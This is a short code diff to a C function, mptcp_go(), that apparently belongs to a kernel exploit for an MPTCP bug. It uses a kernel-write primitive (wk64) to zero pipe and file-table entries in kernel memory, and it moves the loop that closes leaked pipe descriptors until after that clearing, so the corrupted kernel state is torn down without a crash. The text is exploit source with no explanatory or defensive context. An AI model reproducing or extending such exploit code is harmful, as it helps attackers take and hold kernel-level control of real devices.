@@ -887,11 +887,6 @@ void mptcp_go() {
   wk64(pipe + 0x08, 0);
   wk64(pipe + 0x10, 0);
     
- for (int i = 0; i < next_read_fd; i++) {
-    close(write_fds[i]);
-    close(read_fds[i]);
-  }
-  
   // do the same for the other end:
   ofiles_offset = ofiles_base + ((replacer_pipe+1) * 8);
   
@@ -908,6 +903,12 @@ void mptcp_go() {
   wk64(pipe + 0x00, 0);
   wk64(pipe + 0x08, 0);
   wk64(pipe + 0x10, 0);
+  
+  for (int i = 0; i < next_read_fd; i++) {
+    close(write_fds[i]);
+    close(read_fds[i]);
+  }
+  
   
   // that should have cleared everything up!
   printf("done!\n");
